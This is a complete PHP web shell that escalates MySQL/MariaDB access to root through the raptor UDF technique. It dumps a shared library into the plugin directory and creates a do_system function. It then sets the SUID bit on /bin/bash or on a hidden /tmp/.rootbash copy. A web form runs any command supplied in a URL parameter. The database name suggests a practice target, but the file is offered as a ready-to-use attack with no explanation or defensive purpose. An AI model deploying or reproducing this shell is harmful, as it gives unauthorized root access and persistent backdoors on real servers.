<?php
// MySQL UDF Shell - Direct Root Access
error_reporting(0);

$db_host = 'localhost';
$db_user = 'webuser';
$db_pass = 'WebPassw0rd!';
$db_name = 'vulnerable_sns';

if(isset($_GET['action'])) {
    $conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);

    if(!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }

    $action = $_GET['action'];

    if($action == 'dumpfile') {
        // Step 1: DUMPFILE to plugin directory
        $sql = "SELECT * FROM udf_temp INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so'";
        if(mysqli_query($conn, $sql)) {
            echo "[+] DUMPFILE success!<br>";
        } else {
            echo "[-] DUMPFILE error: " . mysqli_error($conn) . "<br>";
        }
    }

    if($action == 'create_function') {
        // Step 2: CREATE FUNCTION
        $sql = "CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so'";
        if(mysqli_query($conn, $sql)) {
            echo "[+] CREATE FUNCTION success!<br>";
        } else {
            echo "[-] CREATE FUNCTION error: " . mysqli_error($conn) . "<br>";
        }
    }

    if($action == 'suid_bash') {
        // Step 3: SUID bash
        $sql = "SELECT do_system('chmod u+s /bin/bash')";
        $result = mysqli_query($conn, $sql);
        if($result) {
            echo "[+] SUID bash created!<br>";
            echo "[+] Execute: /bin/bash -p<br>";
        } else {
            echo "[-] Error: " . mysqli_error($conn) . "<br>";
        }
    }

    if($action == 'cmd' && isset($_GET['c'])) {
        // Execute command via do_system
        $cmd = $_GET['c'];
        $sql = "SELECT do_system('" . mysqli_real_escape_string($conn, $cmd) . "')";
        $result = mysqli_query($conn, $sql);
        if($result) {
            echo "[+] Command executed: $cmd<br>";
        } else {
            echo "[-] Error: " . mysqli_error($conn) . "<br>";
        }
    }

    mysqli_close($conn);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>MySQL UDF Shell</title>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
        a { color: #0ff; text-decoration: none; display: block; margin: 10px 0; }
        a:hover { color: #fff; }
        .section { border: 1px solid #0f0; padding: 15px; margin: 10px 0; }
    </style>
</head>
<body>
    <h1>MySQL UDF Root Shell</h1>

    <div class="section">
        <h2>Step-by-Step Root Access</h2>
        <a href="?action=dumpfile">1. DUMPFILE to plugin directory</a>
        <a href="?action=create_function">2. CREATE FUNCTION do_system</a>
        <a href="?action=suid_bash">3. Create SUID bash</a>
    </div>

    <div class="section">
        <h2>Execute Commands (after UDF creation)</h2>
        <form method="GET">
            <input type="hidden" name="action" value="cmd">
            Command: <input type="text" name="c" size="50" placeholder="chmod u+s /bin/bash">
            <input type="submit" value="Execute">
        </form>
    </div>

    <div class="section">
        <h2>Quick Commands</h2>
        <a href="?action=cmd&c=chmod u+s /bin/bash">chmod u+s /bin/bash</a>
        <a href="?action=cmd&c=cp /bin/bash /tmp/.rootbash && chmod u+s /tmp/.rootbash">Create /tmp/.rootbash</a>
        <a href="?action=cmd&c=id">id</a>
        <a href="?action=cmd&c=whoami">whoami</a>
    </div>
</body>
</html>
